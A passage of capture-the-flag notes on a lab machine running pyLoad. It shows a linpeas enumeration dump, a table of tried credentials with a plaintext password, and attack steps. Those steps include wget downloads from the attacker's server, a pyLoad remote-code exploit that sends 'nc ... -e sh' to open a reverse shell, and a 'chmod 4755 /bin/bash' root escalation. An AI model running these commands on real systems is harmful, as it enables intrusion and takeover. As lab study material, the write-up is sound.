-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 343K Apr  3  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                        
/etc/ld.so.conf                                                                                                                                                 
Content of /etc/ld.so.conf:                                                                                                                                     
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                                                                                                              
  - /usr/lib/x86_64-linux-gnu/libfakeroot                                                                                                                       
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib                                                                                                                                              
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                             
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                       
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                 
══╣ Current shell capabilities                                                                                                                                  
CapInh:  0x0000000000000000=                                                                                                                                    
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                    
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  Sandy0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/snap/core20/1778/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                 
                                                                                                                                                                
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient                                                                                                         
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root 28486 Nov 28  2022 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1482 Feb 10  2023 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                         
files with acls in searched folders Not Found                                                                                                                   
                                                                                                                                                                
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                               
total 36                                                                                                                                                        
drwxr-xr-x  2 root root 4096 Apr 27  2023 .
drwxr-xr-x 98 root root 4096 May 15 09:06 ..
-rw-r--r--  1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rw-r--r--  1 root root  835 Nov 28  2022 apps-bin-path.sh
-rw-r--r--  1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--  1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--  1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--  1 root root  757 Nov  3  2019 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                 
                                                                                                                                                                
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                    
═╣ Credentials in fstab/mtab? ........... No                                                                                                                    
═╣ Can I read shadow files? ............. No                                                                                                                    
═╣ Can I read shadow plists? ............ No                                                                                                                    
═╣ Can I write shadow plists? ........... No                                                                                                                    
═╣ Can I read opasswd file? ............. No                                                                                                                    
═╣ Can I write in network-scripts? ...... No                                                                                                                    
═╣ Can I read root folder? .............. No                                                                                                                    
                                                                                                                                                                
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                          
/home/sau/.viminfo
/home/sau/user.txt
/home/sau/.bash_history
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root sau 33 Nov 11 17:43 /home/sau/user.txt                                                                                                        

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root sau 33 Nov 11 17:43 /home/sau/user.txt                                                                                                        

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                               
/dev/mqueue                                                                                                                                                     
/dev/shm
/home/sau
/run/lock
/run/screen
/run/user/1001
/run/user/1001/dbus-1
/run/user/1001/dbus-1/services
/run/user/1001/gnupg
/run/user/1001/inaccessible
/run/user/1001/systemd
/run/user/1001/systemd/transient
/run/user/1001/systemd/units
/snap/core20/1778/run/lock
/snap/core20/1778/tmp
/snap/core20/1778/var/tmp
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/tmp
/var/tmp/cloud-init

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                               
                                                                                                                                                                


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                             
                            ╚═════════════════════════╝                                                                                                         
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                      
/usr/bin/gettext.sh                                                                                                                                             
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-11-11+19:00:01.4988863400 /opt/app/sqlite.db                                                                                                               
2023-01-11+17:36:48.4374029890 /opt/app/middle.py
2023-01-11+17:36:48.4374029890 /opt/app/app_pb2_grpc.py
2023-01-11+17:36:48.4374029890 /opt/app/app_pb2.py
2023-01-11+17:36:48.4374029890 /opt/app/app.py
2023-01-11+17:36:48.4374029890 /opt/app/app.proto
2023-01-11+17:36:48.4374029890 /opt/app/__pycache__/middle.cpython-310.pyc
2023-01-11+17:36:48.4374029890 /opt/app/__pycache__/login_pb2.cpython-310.pyc
2023-01-11+17:36:48.4374029890 /opt/app/__pycache__/app_pb2_grpc.cpython-310.pyc
2023-01-11+17:36:48.4334029890 /opt/app/__pycache__/login_pb2_grpc.cpython-310.pyc
2023-01-11+17:36:48.4334029890 /opt/app/__pycache__/app_pb2.cpython-310.pyc
2023-01-11+17:36:48.4334029890 /opt/app/__pycache__/app.cpython-310.pyc
2023-01-11+17:21:04.8600363610 /usr/local/bin/pyload
2023-01-11+17:21:04.1877003740 /usr/local/bin/pysemver
2023-01-11+17:21:01.7905024180 /usr/local/bin/filetype
2023-01-11+17:21:01.3662904260 /usr/local/bin/bitmath
2023-01-11+17:21:01.2422284280 /usr/local/bin/pybabel
2023-01-11+17:21:00.5818984390 /usr/local/bin/flask
2023-01-11+17:21:00.2257204480 /usr/local/bin/cheroot
2023-01-11+17:12:02.8171604810 /usr/local/bin/pip3.8
2023-01-11+17:12:02.8171604810 /usr/local/bin/pip3.10
2023-01-11+17:12:02.8171604810 /usr/local/bin/pip3
2023-01-11+17:12:02.8171604810 /usr/local/bin/pip
2023-01-10+21:43:04.6971152480 /etc/grub.d/01_track_initrdless_boot_fallback
2023-01-10+21:41:22.2168433630 /etc/console-setup/cached_setup_terminal.sh
2023-01-10+21:41:22.2168433630 /etc/console-setup/cached_setup_keyboard.sh
2023-01-10+21:41:22.2168433630 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                        
drwxr-xr-x  3 root root 4096 Jan 11  2023 .
drwxr-xr-x 21 root root 4096 Apr 27  2023 ..
drwxr-xr-x  3 root root 4096 Nov 11 18:39 app

╔══════════╣ Unexpected in root
/data                                                                                                                                                           
/vagrant

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/opt/app/sqlite.db                                                                                                                                              
/var/log/auth.log
/var/log/journal/52ecde973e1e49a1b8fbee7dab5410c1/user-1001@f23b6c982f9c4622a8cf65a9fdc7a3a9-00000000000127ca-000609e4e94cb423.journal
/var/log/journal/52ecde973e1e49a1b8fbee7dab5410c1/user-1001.journal
/var/log/journal/52ecde973e1e49a1b8fbee7dab5410c1/system@961ac296dbda4c0d91db73d3b58d3206-000000000000e397-000609e3f9844514.journal
/var/log/journal/52ecde973e1e49a1b8fbee7dab5410c1/system.journal
/var/log/syslog
/home/sau/snap/lxd/common/config/config.yml
/home/sau/.gnupg/pubring.kbx
/home/sau/.gnupg/trustdb.gpg

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                       
logrotate 3.14.0                                                                                                                                                

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/sau (limit 20)
total 864                                                                                                                                                       
drwxr-xr-x 5 sau  sau    4096 Nov 11 19:02 .
drwxr-xr-x 3 root root   4096 Jan 11  2023 ..
lrwxrwxrwx 1 root root      9 Jan 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 sau  sau     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sau  sau    3771 Feb 25  2020 .bashrc
drwx------ 2 sau  sau    4096 Jan 11  2023 .cache
drwx------ 3 sau  sau    4096 Nov 11 19:02 .gnupg
-rw-r--r-- 1 sau  sau     807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root      9 Jan 11  2023 .viminfo -> /dev/null
-rwxrwxr-x 1 sau  sau  847815 Nov 11 18:59 linpeas.sh
drwx------ 3 sau  sau    4096 Nov 11 19:02 snap
-rw-r----- 1 root sau      33 Nov 11 17:43 user.txt

╔══════════╣ Files inside others home (limit 20)
                                                                                                                                                                
╔══════════╣ Searching installed mail applications
                                                                                                                                                                
╔══════════╣ Mails (limit 50)
                                                                                                                                                                
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py                                               
-rw-r--r-- 1 root root 1413 Jan 10  2023 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 44048 Sep 19  2022 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11886 Apr 27  2023 /usr/share/info/dir.old
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 237873 Apr 18  2023 /usr/src/linux-headers-5.4.0-148-generic/.config.old
-rw-r--r-- 1 root root 0 Apr 18  2023 /usr/src/linux-headers-5.4.0-148-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Apr 18  2023 /usr/src/linux-headers-5.4.0-148-generic/include/config/wm831x/backup.h
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-148/tools/testing/selftests/net/tcp_fastopen_backup_key.sh

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /opt/app/sqlite.db: SQLite 3.x database, last written using SQLite version 3037002                                                                        
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001

 -> Extracting tables from /opt/app/sqlite.db (limit 20)
  --> Found interesting column names in accounts (output limit 10)                                                                                              
CREATE TABLE "accounts" (                                                                                                                                       
        username TEXT UNIQUE,
        password TEXT
)
admin, admin

  --> Found interesting column names in messages (output limit 10)
CREATE TABLE messages(id INT UNIQUE, username TEXT UNIQUE,message TEXT)                                                                                         
1, admin, The admin is working hard to fix the issues.

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                                                                    
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                 
                                                                                                                                                                
╔══════════╣ Web files?(output limit)
                                                                                                                                                                
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 landscape landscape 0 Jan 10  2023 /var/lib/landscape/.cleanup.user                                                                                
-rw-r--r-- 1 sau sau 220 Feb 25  2020 /home/sau/.bash_logout
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Jan 10  2023 /etc/.pwd.lock
-rw------- 1 root root 0 Dec 12  2022 /snap/core20/1778/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1778/etc/skel/.bash_logout
-rw------- 1 root root 0 Nov 11 17:43 /run/snapd/lock/.lock
-rw-r--r-- 1 root root 0 Nov 11 17:43 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 4 Nov 11 17:43 /tmp/pyLoad/pyload.pid                                                                                                    

╔══════════╣ Searching passwords in history files
                                                                                                                                                                
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                      
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/local/lib/python3.8/dist-packages/grpc/_cython/_credentials
/usr/local/lib/python3.8/dist-packages/grpc/_cython/_credentials/roots.pem
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                
╔══════════╣ Searching passwords inside logs (limit 70)
[    5.348580] systemd[1]: Started Forward Password Requests to Wall Directory Watch.                                                                           
[    7.994887] systemd[1]: Started Forward Password Requests to Wall Directory Watch.



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                              
                                ╚════════════════╝                                                                                                              
Regexes to search for API keys aren't activated, use param '-r' 


```
- then I downloaded and changed to executable the linux-exploit-suggester.sh file 
```
wget http://10.10.14.20/linux/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
```
- no exploits were found with this tool 
- checked to see if it was vulnerable to a sudo exploit with the following command 
```
sudoedit -s Y
```
- output was information and didn't ask for a password so it doesn't appear to be vulnerable 
- however I was able to find and exploit for sudo 1.8.0-1.9.12 with 
```
searchsploit sudo 1.8
```
- I copied this to my apache2 server download and ran it on the target with the following commands 
```
wget http://10.10.14.20/linux/sudo-1_8-1_9_12.sh
chmod +x sudo-1.8-1_9_12.sh
```
- didn't work. looking for another vector
- noticed a service running on port 8000 checked to see if it was http with the following command 
```
curl http://localhost:8000
```
- here was the output
![[Pasted image 20231111143346.png]]
- going to try to tunnel the connection data with the following command
```
ssh -L 8081:localhost:8000 sau@10.10.11.214
```
- got the webpage 
![[Pasted image 20231111144000.png]]
- the following creds didn't work 

| username | password |
| ---------- | ---------- |
| admin | admin |
| sau | HereIsYourPassWord1431 |
| admin | password |
| pyload | pyload |


- need to get the version of the webserver on the target machine with the following command 
```
pip list | grep "pyload"
```
- output 
```
pyload-ng              0.5.0b3.dev30
```
- may have located an exploit with 
```
searchsploit pyload 
```
- found an exploit with searchsploit which requires a url and command to be provided.
- first i set up a socat TTY listener with the following command 
```
socat -d -d file"`tty`,raw,echo=0 TCP-LISTEN:9001
```
- then I ran the exploit to connect to the listener which works 
```
python3 pyload-exploit.py -u http://localhost:8081 -c "nc 10.10.14.20 9001"
```
- this worked but I had to close the shell so that I can get a reverse shell instead of a connection so i used the following command 
```
python3 pyload-exploit.py -u http://localhost:8081 -c "nc 10.10.14.20 9001 -e sh"
```
- couldn't get the shell to work so I am going to try to change the set-UID privilages of the /bin/bash binary and obtain an admin shell with the following command 
```
python3 pyload-exploit.py -u http://localhost:8081 -c "chmod 4755 /bin/bash"
```
- to check if this works i will run the following to try to get a root console through my sau ssh connection 
```
bash -p
```
- this worked and I am root 
![[Pasted image 20231111150658.png]]
- opening and uploading root.txt 
-